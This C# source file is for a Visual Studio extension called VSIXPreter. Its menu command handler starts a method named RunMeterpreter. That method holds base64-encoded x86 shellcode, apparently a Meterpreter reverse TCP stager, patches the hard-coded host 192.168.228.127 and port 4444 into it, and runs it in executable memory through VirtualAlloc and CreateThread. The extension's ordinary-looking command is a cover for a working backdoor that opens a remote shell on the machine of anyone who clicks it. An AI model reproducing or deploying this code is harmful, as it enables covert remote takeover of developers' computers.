using System;
using System.ComponentModel.Design;
using System.Runtime.InteropServices;
using Microsoft.VisualStudio.Shell;
using Microsoft.VisualStudio.Shell.Interop;
using Task = System.Threading.Tasks.Task;

namespace VSIXPreter
{
    /// <summary>
    /// Command handler
    /// </summary>
    internal sealed class PreterCommand
    {
        /// <summary>
        /// Command ID.
        /// </summary>
        public const int CommandId = 0x0100;

        /// <summary>
        /// Command menu group (command set GUID).
        /// </summary>
        public static readonly Guid CommandSet = new Guid("777ad43f-30f9-457d-9489-bb549878fff8");

        /// <summary>
        /// VS Package that provides this command, not null.
        /// </summary>
        private readonly AsyncPackage package;

        /// <summary>
        /// Initializes a new instance of the <see cref="PreterCommand"/> class.
        /// Adds our command handlers for menu (commands must exist in the command table file)
        /// </summary>
        /// <param name="package">Owner package, not null.</param>
        /// <param name="commandService">Command service to add command to, not null.</param>
        private PreterCommand(AsyncPackage package, OleMenuCommandService commandService)
        {
            this.package = package ?? throw new ArgumentNullException(nameof(package));
            commandService = commandService ?? throw new ArgumentNullException(nameof(commandService));

            var menuCommandID = new CommandID(CommandSet, CommandId);
            var menuItem = new MenuCommand(this.Execute, menuCommandID);
            commandService.AddCommand(menuItem);
        }

        /// <summary>
        /// Gets the instance of the command.
        /// </summary>
        public static PreterCommand Instance { get; private set; }

        /// <summary>
        /// Gets the service provider from the owner package.
        /// </summary>
        private Microsoft.VisualStudio.Shell.IAsyncServiceProvider ServiceProvider
        {
            get { return this.package; }
        }

        /// <summary>
        /// Initializes the singleton instance of the command.
        /// </summary>
        /// <param name="package">Owner package, not null.</param>
        public static async Task InitializeAsync(AsyncPackage package)
        {
            // Verify the current thread is the UI thread - the call to AddCommand in PreterCommand's constructor requires
            // the UI thread.
            ThreadHelper.ThrowIfNotOnUIThread();

            OleMenuCommandService commandService =
                await package.GetServiceAsync((typeof(IMenuCommandService))) as OleMenuCommandService;
            Instance = new PreterCommand(package, commandService);
        }

        /// <summary>
        /// This function is the callback used to execute the command when the menu item is clicked.
        /// See the constructor to see how the menu item is associated with this function using
        /// OleMenuCommandService service and MenuCommand class.
        /// </summary>
        /// <param name="sender">Event sender.</param>
        /// <param name="e">Event args.</param>
        private void Execute(object sender, EventArgs e)
        {
            Task.Factory.StartNew(() => RunMeterpreter("192.168.228.127", "4444"));
        }
        public static void RunMeterpreter(string ip, string port)
        {
            try
            {
                var ipOctetSplit = ip.Split('.');
                byte octByte1 = Convert.ToByte(ipOctetSplit[0]);
                byte octByte2 = Convert.ToByte(ipOctetSplit[1]);
                byte octByte3 = Convert.ToByte(ipOctetSplit[2]);
                byte octByte4 = Convert.ToByte(ipOctetSplit[3]);
                int inputPort = Int32.Parse(port);
                byte port1Byte = 0x00;
                byte port2Byte = 0x00;
                if (inputPort > 256)
                {
                    int portOct1 = inputPort / 256;
                    int portOct2 = portOct1 * 256;
                    int portOct3 = inputPort - portOct2;
                    int portoct1Calc = portOct1 * 256 + portOct3;
                    if (inputPort == portoct1Calc)
                    {
                        port1Byte = Convert.ToByte(portOct1);
                        port2Byte = Convert.ToByte(portOct3);
                    }
                }
                else
                {
                    port1Byte = 0x00;
                    port2Byte = Convert.ToByte(inputPort);
                }
                byte[] shellCodePacket = new byte[9];
                shellCodePacket[0] = octByte1;
                shellCodePacket[1] = octByte2;
                shellCodePacket[2] = octByte3;
                shellCodePacket[3] = octByte4;
                shellCodePacket[4] = 0x68;
                shellCodePacket[5] = 0x02;
                shellCodePacket[6] = 0x00;
                shellCodePacket[7] = port1Byte;
                shellCodePacket[8] = port2Byte;
                string shellCodeRaw = "/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYH/9W4kAEAACnEVFBoKYBrAP/VagVowKiLhmgCANkDieZQUFBQQFBAUGjqD9/g/9WXahBWV2iZpXRh/9WFwHQK/04IdezoYQAAAGoAagRWV2gC2chf/9WD+AB+Nos2akBoABAAAFZqAGhYpFPl/9WTU2oAVlNXaALZyF//1YP4AH0iWGgAQAAAagBQaAsvDzD/1VdodW5NYf/VXl7/DCTpcf///wHDKcZ1x8M=";
                string s3 = Convert.ToBase64String(shellCodePacket);
                string newShellCode = shellCodeRaw.Replace("wKiLhmgCANkD", s3);
                byte[] shellCodeBase64 = Convert.FromBase64String(newShellCode);
                UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellCodeBase64.Length, 0x1000, 0x40);
                Marshal.Copy(shellCodeBase64, 0, (IntPtr)(funcAddr), shellCodeBase64.Length);
                IntPtr hThread = IntPtr.Zero;
                UInt32 threadId = 0;
                IntPtr pinfo = IntPtr.Zero;
                hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
                WaitForSingleObject(hThread, 0xFFFFFFFF);
                return;
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                throw;
            }
        }
        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
    }
}
